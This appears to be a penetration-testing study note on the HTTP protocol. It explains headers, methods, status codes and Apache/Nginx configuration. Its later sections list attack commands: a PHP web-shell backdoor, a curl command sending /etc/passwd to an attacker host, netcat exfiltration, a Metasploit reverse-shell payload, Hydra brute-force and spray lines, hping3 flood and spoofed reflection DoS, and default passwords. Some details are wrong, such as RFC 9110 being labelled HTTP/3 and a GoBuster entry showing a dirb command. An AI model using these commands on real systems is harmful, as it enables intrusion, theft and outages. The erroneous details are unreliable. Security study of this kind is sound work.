# Index
- [[Ports, Protocols, and Services]]

# Hypertext Transfer Protocol (HTTP)

- **Port Number:** 80 (HTTP), 443 (HTTPS)
- **Protocol:** TCP
- **Service Name:** Hypertext Transfer Protocol (HTTP)
- **Defined in:** RFC 1945 (HTTP/1.0), RFC 2616 (HTTP/1.1), RFC 7540 (HTTP/2), RFC 9110 (HTTP/3)

The Hypertext Transfer Protocol (HTTP) is the foundation of data communication on the World Wide Web. It defines how messages are formatted and transmitted, and how web servers and browsers should respond to various commands. HTTP is an application-layer protocol that uses the TCP transport protocol to establish reliable connections.

## Overview of Features

- **Stateless Protocol:** HTTP is stateless, meaning each request from a client to server is treated as an independent transaction, unrelated to any previous request. This simplifies server design but necessitates mechanisms like cookies for maintaining state.
  
- **Methods (Verbs):** HTTP defines several methods, such as GET, POST, PUT, DELETE, etc., each with specific functions. GET retrieves data, POST sends data to be processed, and DELETE removes data.
  
- **Headers:** HTTP headers provide essential information about the request or response, including content type, length, and caching policies. Headers play a critical role in controlling the behavior of HTTP transactions.

- **URL Structure:** HTTP requests use Uniform Resource Locators (URLs) to identify resources. A URL typically consists of a scheme (e.g., http), host (e.g., www.example.com), path (e.g., /index.html), and query string (e.g., ?id=123).

- **Persistent Connections:** Introduced in HTTP/1.1, persistent connections allow multiple requests and responses to be sent over a single TCP connection, improving performance.

- **Secure Version (HTTPS):** HTTP Secure (HTTPS) encrypts data between the client and server using TLS/SSL, providing confidentiality, integrity, and authentication.

## Typical Use Cases

- **Web Browsing:** HTTP is the primary protocol used by web browsers to retrieve and display web pages from servers.
  
- **API Communication:** RESTful APIs often use HTTP as their underlying protocol, enabling applications to interact with each other over the web.

- **File Transfer:** HTTP can be used to download or upload files between clients and servers.

- **Web Services:** HTTP is commonly used in web services for exchanging data, particularly in service-oriented architectures (SOA).

## How HTTP Protocol Works

1. **Client Initiates Connection:**
   - **Step 1:** The client (typically a web browser) resolves the IP address of the server using DNS and establishes a TCP connection to port 80 (or 443 for HTTPS).

2. **HTTP Request:**
   - **Step 2:** The client sends an HTTP request to the server. The request includes:
     - **Request Line:** Specifies the HTTP method (e.g., GET), the resource path, and the HTTP version.
     - **Headers:** Provide additional information about the request, such as `Host`, `User-Agent`, `Accept`, etc.
     - **Body** (optional): Contains data sent to the server (e.g., form data in a POST request).

3. **Server Processes Request:**
   - **Step 3:** The server receives the request, processes it, and determines the appropriate response. The server may execute scripts, query databases, or retrieve files as needed.

4. **HTTP Response:**
   - **Step 4:** The server sends an HTTP response back to the client. The response includes:
     - **Status Line:** Indicates the result of the request (e.g., 200 OK, 404 Not Found).
     - **Headers:** Provide metadata about the response, such as `Content-Type`, `Content-Length`, and caching directives.
     - **Body** (optional): Contains the requested resource (e.g., an HTML document, image, or JSON data).

5. **Client Processes Response:**
   - **Step 5:** The client processes the response, rendering the content in the web browser or handling it according to the application’s logic.

6. **Connection Closure:**
   - **Step 6:** In HTTP/1.0, the connection is typically closed after each request/response pair. In HTTP/1.1 and later, the connection may be kept open for additional requests.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends a GET request for `/index.html` to `<target_ip>`:80.
- **Server:** `<target_ip>` returns the HTML content of `/index.html` with a 200 OK status.

# Additional Information

## HTTP Versions

- **HTTP/1.0:** The original version defined in RFC 1945. It uses a new TCP connection for each request/response pair, which can be inefficient.
  
- **HTTP/1.1:** Defined in RFC 2616, HTTP/1.1 introduced persistent connections, chunked transfer encoding, and additional cache control mechanisms. It is the most widely used version.
  
- **HTTP/2:** Defined in RFC 7540, HTTP/2 introduces multiplexing, header compression, and server push, significantly improving performance over HTTP/1.1.

- **HTTP/3:** Defined in RFC 9110, HTTP/3 is based on the QUIC transport protocol, which uses UDP instead of TCP. It provides faster connection establishment and improved performance in lossy networks.

## HTTP Headers
HTTP headers are used to pass additional information with HTTP requests and responses. They include:

**General Headers:** Apply to both request and response messages (e.g., Date, Connection).
**Request Headers:** Contain more information about the resource to be fetched or about the client itself (e.g., User-Agent, Accept).
**Response Headers:** Contain additional information about the server response (e.g., Server, Set-Cookie).
**Entity Headers:** Contain information about the body of the resource (e.g., Content-Type, Content-Length).

|**Header**|**Description**|
|-|-|
| Host             | Specifies the domain name of the server and the TCP port number on which the server is listening. |
| User-Agent       | Contains information about the user agent originating the request.                                |
| Accept           | Informs the server about the types of data that can be sent back.                                 |
| Content-Type     | Indicates the media type of the resource or the data being sent.                                  |
| Authorization    | Contains the credentials to authenticate a user agent with a server.                              |
| Cookie           | Sends stored cookies to the server.                                                               |
| Set-Cookie       | Sends cookies from the server to the user agent.                                                  |
| Cache-Control    | Directives for caching mechanisms in both requests and responses.                                 |
| Connection       | Controls whether the network connection stays open after the current transaction.                 |
| Content-Encoding | Specifies the encoding transformations that have been applied to the resource.                    |

## HTTP Methods (Verbs)

- **GET:** Retrieve data from the server. Typically used for fetching HTML documents, images, or other resources.
- **POST:** Send data to the server for processing. Commonly used for submitting form data or uploading files.
- **PUT:** Upload a representation of the specified resource. Often used in RESTful APIs.
- **DELETE:** Remove the specified resource from the server.
- **HEAD:** Retrieve the headers for a resource without fetching the body.
- **OPTIONS:** Request information about the communication options available on the server.
- **PATCH:** Apply partial modifications to a resource.

## HTTP Status Codes
HTTP (Hypertext Transfer Protocol) is the protocol used for communication between web servers and clients. HTTP status codes are 3-digit numbers returned by the server in response to a client's request, indicating the status of the request. There are five categories of HTTP status codes:

- 1xx (Informational): The request was received, continuing process
- 2xx (Successful): The request was successfully received, understood, and accepted
- 3xx (Redirection): Further action needs to be taken in order to complete the request
- 4xx (Client Error): The request contains bad syntax or cannot be fulfilled
- 5xx (Server Error): The server failed to fulfill an apparently valid request

HTTP status codes are an important part of web development and website management. They provide important information about the status of requests and can help to diagnose issues with web servers and applications. When developing a website or web application, it is important to ensure that the appropriate HTTP status codes are returned for each request to ensure that the client is receiving the correct information and that errors are handled appropriately.

[https://www.rfc-editor.org/rfc/rfc9110.html#name-status-codes](https://www.rfc-editor.org/rfc/rfc9110.html#name-status-codes)

[https://developer.mozilla.org/en-US/docs/Web/HTTP/Status](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)

## [[URL Encoding]]
URL encoding converts characters into a format that can be transmitted over the Internet. URLs can only be sent over the Internet using the ASCII character-set. Since URLs often contain characters outside the ASCII set, the URL has to be converted into a valid ASCII format. URL encoding replaces unsafe ASCII characters with a "%" followed by two hexadecimal digits. URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.

[https://www.w3schools.com/tags/ref_urlencode.ASP](https://www.w3schools.com/tags/ref_urlencode.ASP)

### URL Encoding Functions
In JavaScript, PHP, and ASP there are functions that can be used to URL encode a string. PHP has the rawurlencode() function, and ASP has the Server.URLEncode() function. In JavaScript you can use the encodeURIComponent() function.

### ASCII Encoding Reference
Your browser will encode input, according to the character-set used in your page. The default character-set in HTML5 is UTF-8.

## Security Considerations

- **Sensitive Data Exposure:** HTTP transmits data in plaintext, making it vulnerable to interception and eavesdropping. HTTPS should be used to secure sensitive data.
  
- **Man-in-the-Middle (MITM) Attacks:** Without HTTPS, HTTP traffic can be intercepted and modified by attackers, leading to data tampering or injection of malicious content.

- **Cross-Site Scripting (XSS):** Attackers can inject malicious scripts into web pages, potentially compromising the security of users visiting the site.

- **SQL Injection:** Improper handling of user input in HTTP requests can lead to SQL injection attacks, where attackers execute arbitrary SQL queries on the server’s database.

## Caching

- **Client-Side Caching:** Browsers cache HTTP responses to reduce latency and bandwidth usage. Headers like `Cache-Control` and `ETag` control how resources are cached.
  
- **Proxy Caching:** Intermediate proxy servers can cache HTTP responses to serve multiple clients, improving performance and reducing server load.

## Cookies

- **Session Management:** HTTP cookies are used to maintain session state between requests. They can store user authentication tokens, preferences, and other stateful information.
  
- **Security Concerns:** Cookies are vulnerable to attacks like cross-site request forgery (CSRF) and cross-site scripting (XSS) if not properly secured using attributes like `HttpOnly`, `Secure`, and `SameSite`.

## Configuration Files

HTTP services are typically configured using web server configuration files. Below are common configurations for Apache HTTP Server and Nginx.

1. **Apache HTTP Server:**
- **File Location:** `/etc/httpd/conf/httpd.conf` or `/etc/apache2/apache2.conf`
- **Configuration Example:**
  ```apache
  <VirtualHost *:80>
      ServerAdmin webmaster@domain.com
      DocumentRoot /var/www/html
      ServerName www.domain.com

      <Directory /var/www/html>
          Options Indexes FollowSymLinks
          AllowOverride All
          Require all granted
      </Directory>

      ErrorLog ${APACHE_LOG_DIR}/error.log
      CustomLog ${APACHE_LOG_DIR}/access.log combined
  </VirtualHost>
  ```
- **Key Settings:**
  - `DocumentRoot`: Specifies the directory where the website files are stored.
  - `ServerName`: The domain name of the website.
  - `ErrorLog` and `CustomLog`: Paths to the error and access log files.

2. **Nginx:**
- **File Location:** `/etc/nginx/nginx.conf` or `/etc/nginx/sites-available/default`
- **Configuration Example:**
  ```nginx
  server {
      listen 80;
      server_name www.domain.com;

      root /var/www/html;
      index index.html index.htm;

      location / {
          try_files $uri $uri/ =404;
      }

      error_page 500 502 503 504 /50x.html;
      location = /50x.html {
          root /usr/share/nginx/html;
      }

      access_log /var/log/nginx/access.log;
      error_log /var/log/nginx/error.log;
  }
  ```
- **Key Settings:**
  - `server_name`: Specifies the domain name of the website.
  - `root`: Defines the root directory for the server.
  - `access_log` and `error_log`: Paths to the access and error log files.

## Potential Misconfigurations

### Insecure HTTP Configuration

- **Lack of HTTPS:**
  - **Risk:** Sensitive data, including passwords and personal information, is transmitted in plaintext, making it vulnerable to interception.
  - **Exploitation:** An attacker can intercept HTTP traffic using tools like Wireshark or a MITM proxy, capturing sensitive data.

- **Directory Listing Enabled:**
  - **Risk:** If directory listing is enabled, an attacker can browse the file structure of the web server, potentially discovering sensitive files.
  - **Exploitation:** Attackers can use this information to identify files that may contain vulnerabilities, such as configuration files or backup scripts.

- **Misconfigured CORS (Cross-Origin Resource Sharing):**
  - **Risk:** Improperly configured CORS can allow unauthorized domains to access resources on the server, leading to data leakage.
  - **Exploitation:** Attackers can craft malicious websites that exploit lax CORS policies to steal sensitive data or perform unauthorized actions.

### Excessive Permissions

- **Writable Web Directories:**
  - **Risk:** If web directories are writable by the web server user, attackers can upload malicious files (e.g., web shells) to the server.
  - **Exploitation:** An attacker uploads a PHP web shell, allowing them to execute arbitrary commands on the server.

- **Weak Authentication:**
  - **Risk:** Weak or default credentials for admin panels or other sensitive areas can be easily guessed or brute-forced.
  - **Exploitation:** An attacker gains access to the administrative interface and can modify server settings, upload malicious code, or deface the website.

## Default Credentials

Default credentials are not typically associated with the HTTP protocol itself, but many web applications or devices that use HTTP for administration may have default credentials.

- **Apache Tomcat:**
  - **Username:** admin
  - **Password:** admin

- **Cisco Devices:**
  - **Username:** admin
  - **Password:** cisco

- **WordPress:**
  - **Username:** admin
  - **Password:** password

# Interaction and Tools

## Tools

### [[Telnet]]
- **Telnet Connect:** Establishes a connection to the specified IP.
	```bash
	telnet <target_ip> 80
	```

### [[cURL]]
- **Curl (Testing HTTP):** Sends an HTTP request to the target server and displays detailed information about the response.
	```bash
	curl -v http://<target_ip>:<target_port>
	```
- **GET request:** Retrieves the content of `index.html` from the target server.
	```bash
	curl http://<target_ip>:<target_port>/index.html
	```
- **POST request:** Submits a POST request with form data to the target server.
	```bash
	curl -X POST -d "username=admin&password=secret" http://<target_ip>:<target_port>/login
	```
- **Custom Headers:** Sends a GET request with a custom header to the target server.
	```bash
	curl -H "X-Custom-Header: value" http://<target_ip>:<target_port>/
	```
- **HTTPS with Client Certificate:** Makes an HTTPS request using a client certificate for mutual TLS authentication.
	```bash
	curl --cert client.crt --key client.key https://<target_ip>:<target_port>/
	```

### [[WGet]]
- **Download File:** Downloading files, mirroring websites, and automated retrieval of web resources.
    ```bash
    wget http://<target_ip>/file
    ```
- **Recursive Download:** Recursively downloads all files and directories from the target server.
	```bash
	wget -r http://<target_ip>/
	```

### [[WhatWeb]]
- **Query Domain:** Identifies the web server software, version, and technologies in use.
    ```bash
    whatweb http://<target_ip>/
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 80"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 80
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 80
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 80 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 80
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 80 < secret_data.txt
    ```
- **HTTP Request:** Sends a manual HTTP GET request to retrieve `index.html` from the target server.
    ```bash
    echo -e "GET /index.html HTTP/1.1\r\nHost: <target_ip>\r\n\r\n" | nc <target_ip> 80
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:80
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 80 -c 1
    ```

### [[Burp Suite]]

### [[Nikto]]
- **Scan Domain:** Automated scanning of web servers for common vulnerabilities and misconfigurations.
    ```bash
    nikto -h http://<target_ip>/
    ```

### [[OWASP ZAP]]

### [[Dirb]]
- **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.
    ```bash
    dirb http://<target_ip>/
    ```

### [[Ffuf]]
- **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.
    ```bash
    ffuf -w /path/to/wordlist -u https://<target_domain>/FUZZ
    ```

### [[GoBuster]]
- **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.
    ```bash
    dirb http://<target_ip>/
    ```

# Penetration Testing Techniques

## See Also
### [[Web Application]]
### [[Web Application Enumeration]]
### [[Front End Vulnerabilities]]
#### [[1. Sensitive Data Exposure]]
#### [[2. HTML Injection]]
#### [[3. Insecure Direct Object References (IDOR)]]
#### [[4. Cross-Site Scripting (XSS)]]
#### [[5. Cross-Site Request Forgery (CSRF)]]
#### [[6. Insufficient Transport Layer Protection]]
#### [[7. Insecure Handling of Cookies and Sessions]]
#### [[8. Security Misconfigurations|8. Security Misconfigurations]]
### [[Back End Vulnerabilities]]
#### [[1. Insecure File Uploads]]
#### [[2. File Inclusion]]
#### [[3. Command Injection]]
#### [[4. SQL Injection (SQLi)]]
#### [[5. Server-Side Request Forgery (SSRF)]]
#### [[6. Server-Side Template Injection (SSTi)]]
#### [[7. XML External Entity (XXE)]]
#### [[8. Insecure Deserialization]]
#### [[9. Security Misconfigurations|9. Security Misconfigurations]]

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 80
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 80
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Web Server Fingerprinting
- **Tool:** [[WhatWeb]]
    ```bash
    whatweb http://<target_ip>/
    ```
- **Description:** Identifies the web server software, version, and technologies in use.

### Directory Brute-Forcing
- **Tool:** [[Dirb]]
    ```bash
    dirb http://<target_ip>/
    ```
- **Description:** Brute-forces directories and files on the web server to discover hidden resources.

<br>

- **Tool:** [[Ffuf]]
	```bash
	ffuf -w /path/to/wordlist -u http://<target_domain>/FUZZ
	```
- **Description:** Brute-forces directories and files on the web server to discover hidden resources.

<br>

- **Tool:** [[GoBuster]]
    ```bash
    gobuster <mode> -d <target_domain> -w /path/to/wordlist
    ```
- **Description:** Brute-forces directories and files on the web server to discover hidden resources.

### Web Scanning
- **Tool:** [[Burp Suite]]
- **Description:** Perform in-depth scans using Burp Suite to potentially identify vulnerabilities and sensitive data.

## Persistence

### Backdoor in Web Application
- **Tool:** [[Custom Scripts]]
    ```php
    <?php echo shell_exec($_GET['cmd']); ?>
    ```
- **Description:** Embeds a backdoor into an existing web application file, allowing remote command execution.

## Lateral Movement, Pivoting, and Tunneling

### HTTP Tunneling
- **Tool:** [[SoCat Cheat Sheet]]
    ```bash
    socat TCP-LISTEN:8080,fork,reuseaddr PROXY:<target_ip>:80,proxyport=8080
    ```
- **Description:** Creates a tunnel through HTTP to bypass firewalls or move laterally within a network.

### Pivoting through Web Applications
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    use exploit/multi/http/phpmyadmin_lfi
    set RHOSTS <target_ip>
    set PAYLOAD php/reverse_php
    run
    ```
- **Description:** Exploits a web application vulnerability to establish a foothold and pivot to other internal network resources.

## Defense Evasion

### HTTP Traffic Obfuscating
- **Tool:** [[cURL]]
    ```bash
    curl -H "X-Forwarded-For: 127.0.0.1" http://<target_ip>/
    ```
- **Description:** Obfuscates the source of HTTP requests to evade detection by IDS/IPS systems.

### Encoding Payloads
- **Tool:** [[cURL]]
    ```bash
    echo -n 'payload' | base64
    curl http://<target_ip>/?cmd=$(echo 'payload_base64' | base64 -d)
    ```
- **Description:** Encodes payloads in Base64 or other formats to bypass security filters.

## Data Exfiltration

### Data Exfiltration via HTTP
- **Tool:** [[cURL]], [[WGet]]
    ```bash
    curl -X POST -d "data=$(cat /etc/passwd)" http://<attack_ip>/exfil
    ```
- **Description:** Exfiltrates data from the target server to an external server using HTTP POST requests.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra http-post-form "http://<target_ip>/login:username=^USER^&password=^PASS^:F=incorrect" -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra http-post-form "http://<target_ip>/login:username=^USER^&password=^PASS^:F=incorrect" -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 2616 (HTTP/1.1)|https://tools.ietf.org/html/rfc2616|
|RFC 7540 (HTTP/2)|https://tools.ietf.org/html/rfc7540|
|RFC 9110 (HTTP/3)|https://tools.ietf.org/html/rfc9110|
|cURL Documentation|https://curl.se/docs/|
|Wget Manual|https://www.gnu.org/software/wget/manual/wget.html|
|OWASP HTTP Security Cheat Sheet|https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html|
|Burp Suite Documentation|https://portswigger.net/burp/documentation|
|SQLmap Official Site|https://sqlmap.org/|
|Nikto Web Scanner|https://cirt.net/Nikto2|
|Metasploit Documentation|https://docs.metasploit.com/|